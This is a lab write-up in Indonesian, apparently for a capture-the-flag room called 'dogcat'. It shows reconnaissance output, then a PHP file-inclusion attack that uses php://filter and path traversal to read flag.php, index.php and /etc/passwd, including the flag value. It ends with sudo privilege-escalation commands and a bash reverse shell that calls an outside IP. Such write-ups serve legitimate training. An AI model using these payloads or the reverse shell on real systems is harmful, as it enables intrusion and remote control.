=======================================================
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 24:31:19:2a:b1:97:1a:04:4e:2c:36:ac:84:0a:75:87 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCeKBugyQF6HXEU3mbcoDHQrassdoNtJToZ9jaNj4Sj9MrWISOmr0qkxNx2sHPxz89dR0ilnjCyT3YgcI5rtcwGT9RtSwlxcol5KuDveQGO8iYDgC/tjYYC9kefS1ymnbm0I4foYZh9S+erXAaXMO2Iac6nYk8jtkS2hg+vAx+7+5i4fiaLovQSYLd1R2Mu0DLnUIP7jJ1645aqYMnXxp/bi30SpJCchHeMx7zsBJpAMfpY9SYyz4jcgCGhEygvZ0jWJ+qx76/kaujl4IMZXarWAqchYufg57Hqb7KJE216q4MUUSHou1TPhJjVqk92a9rMUU2VZHJhERfMxFHVwn3H
|   256 21:3d:46:18:93:aa:f9:e7:c9:b5:4c:0f:16:0b:71:e1 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBouHlbsFayrqWaldHlTkZkkyVCu3jXPO1lT3oWtx/6dINbYBv0MTdTAMgXKtg6M/CVQGfjQqFS2l2wwj/4rT0s=
|   256 c1:fb:7d:73:2b:57:4a:8b:dc:d7:6f:49:bb:3b:d0:20 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIfp73VYZTWg6dtrDGS/d5NoJjoc4q0Fi0Gsg3Dl+M3I
80/tcp open  http    syn-ack Apache httpd 2.4.38 ((Debian))
|_http-title: dogcat
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.38 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
===============================================================

whatweb http://10.10.49.168
http://10.10.49.168 [200 OK] Apache[2.4.38], Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.38 (Debian)], IP[10.10.49.168], PHP[7.4.3], Title[dogcat], X-Powered-By[PHP/7.4.3]

===========================================================

gobuster
/index.php            (Status: 200) [Size: 418]
/cat.php              (Status: 200) [Size: 26] 
/flag.php             (Status: 200) [Size: 0]  
/cats                 (Status: 301) [Size: 311] [--> http://10.10.49.168/cats/]
/dogs                 (Status: 301) [Size: 311] [--> http://10.10.49.168/dogs/]
/dog.php  

===========================================================

Ketika kita membuka web maka kita disuguhkan 2 pilihan yaitu cat dan dog.

Saat mengklik cat atau dog url akan berubah sesuai dengan apa yang kita pilih
http://10.10.20.68/?view=dog
http://10.10.20.68/?view=cat

================================================================

Saat kita ubah value pada ?view=value, misal ?view=bat maka pesan yang ditampilkan adalah Sorry, only dogs or cats are allowed. 
Selain dog atau cat, pesan yang muncul adalah Sorry, only dogs or cats are allowed. 

===================================================================

Namun jika ditambah tanda petik pada cat atau dog, maka akan muncul error PHP. Misal, ?view=cat"

Warning: include(cat".php): failed to open stream: No such file or directory in /var/www/html/index.php on line 24

Warning: include(): Failed opening 'cat".php' for inclusion (include_path='.:/usr/local/lib/php') in /var/www/html/index.php on line 24

=====================================================================

Bisa kita simpulkan bahwa bisa kita injeksikan payload pada ?view=

======================================================================

Di PHP terdapat wrapper filter yang memungkinkan operasi data yang nantinya dibaca atau ditulis oleh PHP. Misal mengonversi output ke base64

https://book.hacktricks.xyz/pentesting-web/file-inclusion#php-filter
https://www.idontplaydarts.com/2011/02/using-php-filter-for-local-file-inclusion/

Pada referensi di atas kita bisa menggunakan  base64-encode
http://ip/?view=php://filter/convert.base64-encode/resource=cat

Maka hasilnya adalah 

<!DOCTYPE HTML>
<html>
<head>
    <title>dogcat</title>
    <link rel="stylesheet" type="text/css" href="/style.css">
</head>
<body>
    <h1>dogcat</h1>
    <i>a gallery of various dogs or cats</i>
    <div>
       <h2>What would you like to see?</h2>
        <a href="/?view=dog"><button id="dog">A dog</button></a> <a href="/?view=cat"><button id="cat">A cat</button></a><br>
        Here you go!PGltZyBzcmM9ImNhdHMvPD9waHAgZWNobyByYW5kKDEsIDEwKTsgPz4uanBnIiAvPg0K    </div>
</body>
</html>


=======================================================================

Seperti yang dilihat isi file cat.php kini dikonversi menjadi base64
Here you go!PGltZyBzcmM9ImNhdHMvPD9waHAgZWNobyByYW5kKDEsIDEwKTsgPz4uanBnIiAvPg0K

Yang ketika didecode menjadi
<img src="cats/<?php echo rand(1, 10); ?>.jpg" />

=============================================================================

Mari kita coba melakukan path traversal

Seperti yang kita tahu saat menggunakan gobuster terdapat file flag.php yang bisa kita baca 
http://ip/?view=php://filter/convert.base64-encode/resource=cat/../flag

Hasilnya adalah PD9waHAKJGZsYWdfMSA9ICJUSE17VGgxc18xc19OMHRfNF9DYXRkb2dfYWI2N2VkZmF9Igo/Pgo=
Jika didecode 
<?php
$flag_1 = "THM{Th1s_1s_N0t_4_Catdog_ab67edfa}"
?>

=============================================================================
Membaca index

http://ip/?view=php://filter/convert.base64-encode/resource=cat/../index

Yang dihasilkan adalah 

PCFET0NUWVBFIEhUTUw+CjxodG1sPgoKPGhlYWQ+CiAgICA8dGl0bGU+ZG9nY2F0PC90aXRsZT4KICAgIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgdHlwZT0idGV4dC9jc3MiIGhyZWY9Ii9zdHlsZS5jc3MiPgo8L2hlYWQ+Cgo8Ym9keT4KICAgIDxoMT5kb2djYXQ8L2gxPgogICAgPGk+YSBnYWxsZXJ5IG9mIHZhcmlvdXMgZG9ncyBvciBjYXRzPC9pPgoKICAgIDxkaXY+CiAgICAgICAgPGgyPldoYXQgd291bGQgeW91IGxpa2UgdG8gc2VlPzwvaDI+CiAgICAgICAgPGEgaHJlZj0iLz92aWV3PWRvZyI+PGJ1dHRvbiBpZD0iZG9nIj5BIGRvZzwvYnV0dG9uPjwvYT4gPGEgaHJlZj0iLz92aWV3PWNhdCI+PGJ1dHRvbiBpZD0iY2F0Ij5BIGNhdDwvYnV0dG9uPjwvYT48YnI+CiAgICAgICAgPD9waHAKICAgICAgICAgICAgZnVuY3Rpb24gY29udGFpbnNTdHIoJHN0ciwgJHN1YnN0cikgewogICAgICAgICAgICAgICAgcmV0dXJuIHN0cnBvcygkc3RyLCAkc3Vic3RyKSAhPT0gZmFsc2U7CiAgICAgICAgICAgIH0KCSAgICAkZXh0ID0gaXNzZXQoJF9HRVRbImV4dCJdKSA/ICRfR0VUWyJleHQiXSA6ICcucGhwJzsKICAgICAgICAgICAgaWYoaXNzZXQoJF9HRVRbJ3ZpZXcnXSkpIHsKICAgICAgICAgICAgICAgIGlmKGNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICdkb2cnKSB8fCBjb250YWluc1N0cigkX0dFVFsndmlldyddLCAnY2F0JykpIHsKICAgICAgICAgICAgICAgICAgICBlY2hvICdIZXJlIHlvdSBnbyEnOwogICAgICAgICAgICAgICAgICAgIGluY2x1ZGUgJF9HRVRbJ3ZpZXcnXSAuICRleHQ7CiAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgIGVjaG8gJ1NvcnJ5LCBvbmx5IGRvZ3Mgb3IgY2F0cyBhcmUgYWxsb3dlZC4nOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgPz4KICAgIDwvZGl2Pgo8L2JvZHk+Cgo8L2h0bWw+Cg==

Di mana base64 tersebut jika didecode adalah sebuah isi dari index.php

=========================================================================

Setelah didecode hasilnya adalah

<!DOCTYPE HTML>
<html>
<head>
    <title>dogcat</title>
    <link rel="stylesheet" type="text/css" href="/style.css">
</head>
<body>
    <h1>dogcat</h1>
    <i>a gallery of various dogs or cats</i>
    <div>
    <h2>What would you like to see?</h2>
        <a href="/?view=dog"><button id="dog">A dog</button></a> <a href="/?view=cat"><button id="cat">A cat</button></a><br>
        <?php
            function containsStr($str, $substr) {
                return strpos($str, $substr) !== false;
            }
	    $ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
            if(isset($_GET['view'])) {
                if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {
                    echo 'Here you go!';
                    include $_GET['view'] . $ext;
                } else {
                    echo 'Sorry, only dogs or cats are allowed.';
                }
            }
        ?>
    </div>
</body>
</html>

=============================================================================

Jika kita lihat kode PHP di atas
<?php include $_GET['view'] . $ext; ?>

Kode di atas jika dijalankan maka akan memanggil dari herf ?view=dog atau ?view=cat lalu menambahkan ekstensi PHP di belakangnya

Kita bisa membypass nya dengan menamhakan ampersand atau menjadi &ext

curl "http://10.10.77.115/?view=php://filter/convert.base64-encode/resource=dog/../../../../../etc/passwd&ext"

Privilege Escalation
sudo -l 
/usr/bin/env /bin/bash -p 

printf '#!/bin/bash\nbash -i >& /dev/tcp/10.18.4.222/8080 0>&1' > backup.sh

